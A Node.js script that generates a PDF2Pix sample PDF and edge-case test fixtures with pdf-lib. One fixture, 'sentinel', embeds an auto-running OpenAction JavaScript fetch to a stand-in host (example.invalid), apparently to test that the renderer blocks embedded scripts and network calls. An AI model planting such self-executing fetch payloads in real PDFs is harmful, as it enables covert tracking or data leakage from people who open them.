import {
  PDFDocument,
  PDFName,
  PDFString,
  StandardFonts,
  rgb,
  degrees,
} from 'pdf-lib';
import { PNG } from 'pngjs';
import { mkdir, writeFile } from 'node:fs/promises';
const green = rgb(0.15, 0.36, 0.28);
const ink = rgb(0.12, 0.18, 0.15);
const cream = rgb(0.94, 0.95, 0.91);
const fixedDate = new Date('2026-01-01T00:00:00.000Z');
async function create() {
  const pdf = await PDFDocument.create();
  pdf.setCreationDate(fixedDate);
  pdf.setModificationDate(fixedDate);
  pdf.setProducer('PDF2Pix deterministic fixture generator');
  return pdf;
}
await mkdir('tests/fixtures', { recursive: true });
await mkdir('public', { recursive: true });
const pdf = await create();
const regular = await pdf.embedFont(StandardFonts.Helvetica);
const bold = await pdf.embedFont(StandardFonts.HelveticaBold);
const serif = await pdf.embedFont(StandardFonts.TimesRomanItalic);
function base(size, number, title, subtitle) {
  const p = pdf.addPage(size);
  const [w, h] = size;
  p.drawRectangle({ x: 0, y: 0, width: w, height: h, color: cream });
  p.drawText('PDF2PIX  /  A LITTLE SAMPLE OF WHAT IS POSSIBLE', {
    x: 42,
    y: h - 45,
    size: 10,
    font: bold,
    color: green,
  });
  p.drawText(title, { x: 42, y: h - 108, size: 34, font: bold, color: ink });
  p.drawText(subtitle, {
    x: 42,
    y: h - 138,
    size: 12,
    font: regular,
    color: green,
  });
  p.drawLine({
    start: { x: 42, y: 50 },
    end: { x: w - 42, y: 50 },
    thickness: 1,
    color: green,
  });
  p.drawText(`PAGE ${number}  /  MADE FOR YOU. KEPT WITH YOU.`, {
    x: 42,
    y: 30,
    size: 10,
    font: bold,
    color: green,
  });
  return p;
}
const p1 = base(
  [612, 792],
  1,
  'Good things stay private.',
  'Sharp type. Bold color. Every detail, right in your browser.',
);
p1.drawRectangle({ x: 42, y: 245, width: 528, height: 345, color: green });
for (let i = 0; i < 60; i++)
  p1.drawRectangle({
    x: 62 + i * 8,
    y: 265,
    width: 8,
    height: 90 + i * 3,
    color: rgb(0.3 + i / 140, 0.58 + i / 200, 0.42 + i / 180),
  });
p1.drawCircle({ x: 435, y: 500, size: 63, color: rgb(0.96, 0.77, 0.36) });
p1.drawText('01', { x: 64, y: 510, size: 56, font: bold, color: cream });
p1.drawText('A PDF is more than a page.', {
  x: 42,
  y: 195,
  size: 24,
  font: serif,
  color: ink,
});
p1.drawText('Export a single moment, or the whole story. No upload required.', {
  x: 42,
  y: 163,
  size: 12,
  font: regular,
  color: ink,
});
const raster = new PNG({ width: 320, height: 200 });
for (let y = 0; y < 200; y++)
  for (let x = 0; x < 320; x++) {
    const i = (y * 320 + x) * 4;
    raster.data[i] = 40 + x / 2;
    raster.data[i + 1] = 100 + y / 2;
    raster.data[i + 2] = 90 + Math.sin(x / 30) * 40;
    raster.data[i + 3] = 255;
  }
const picture = await pdf.embedPng(PNG.sync.write(raster));
const p2 = base(
  [612, 792],
  2,
  'A different perspective.',
  'Images, transparency and layers. All locally rendered.',
);
p2.drawImage(picture, { x: 42, y: 360, width: 528, height: 220 });
p2.drawCircle({
  x: 185,
  y: 305,
  size: 95,
  color: rgb(0.9, 0.5, 0.3),
  opacity: 0.65,
});
p2.drawCircle({ x: 300, y: 305, size: 95, color: green, opacity: 0.65 });
p2.drawText('02', { x: 460, y: 255, size: 60, font: bold, color: green });
p2.drawText('Original artwork. No external assets.', {
  x: 42,
  y: 145,
  size: 18,
  font: serif,
  color: ink,
});
const p3 = base(
  [792, 612],
  3,
  'Room to explore.',
  'Landscape pages, fine lines and rotated typography.',
);
for (let i = 0; i < 28; i++)
  p3.drawLine({
    start: { x: 50 + i * 10, y: 100 },
    end: { x: 340, y: 425 - i * 9 },
    thickness: 0.6,
    color: green,
  });
p3.drawText('Stay curious.', {
  x: 410,
  y: 225,
  size: 42,
  font: serif,
  color: green,
  rotate: degrees(16),
});
p3.drawText('03', { x: 650, y: 95, size: 70, font: bold, color: green });
pdf.setTitle('PDF2Pix sample — three pages of local possibilities');
await writeFile(
  'public/sample.pdf',
  await pdf.save({ useObjectStreams: false }),
);
for (const kind of [
  'text',
  'raster',
  'vector',
  'transparent',
  'rotated',
  'mixed',
  'sentinel',
  'crop',
]) {
  const doc = await create();
  const font = await doc.embedFont(StandardFonts.Helvetica);
  if (kind === 'sentinel') {
    doc.catalog.set(
      PDFName.of('OpenAction'),
      doc.context.obj({
        S: 'JavaScript',
        JS: PDFString.of(
          "fetch('https://example.invalid/PRIVATE-SENTINEL-7c924b')",
        ),
      }),
    );
  }
  const pages =
    kind === 'mixed'
      ? [
          [144, 216],
          [216, 144],
          [180, 180],
        ]
      : [[144, 216]];
  for (const size of pages) {
    const p = doc.addPage(size);
    if (kind === 'rotated') p.setRotation(degrees(90));
    if (kind === 'crop') p.setCropBox(10, 20, 100, 150);
    p.drawText(
      kind === 'sentinel' ? 'PRIVATE-SENTINEL-7c924b' : `Fixture: ${kind}`,
      { x: 12, y: 160, size: 8, font, color: ink },
    );
    if (kind === 'raster')
      p.drawImage(await doc.embedPng(PNG.sync.write(raster)), {
        x: 20,
        y: 35,
        width: 100,
        height: 70,
      });
    if (['vector', 'transparent', 'mixed'].includes(kind))
      p.drawRectangle({
        x: 20,
        y: 30,
        width: 70,
        height: 70,
        color: green,
        opacity: kind === 'transparent' ? 0.5 : 1,
      });
  }
  await writeFile(
    `tests/fixtures/${kind}.pdf`,
    await doc.save({ useObjectStreams: false }),
  );
}
await writeFile(
  'tests/fixtures/corrupt.pdf',
  '%PDF-1.7\ncorrupt input, no objects',
);
await writeFile('tests/fixtures/empty.pdf', '');
await writeFile('tests/fixtures/renamed.pdf', 'This is not a PDF.');
console.log('Generated sample and 11 edge fixtures.');
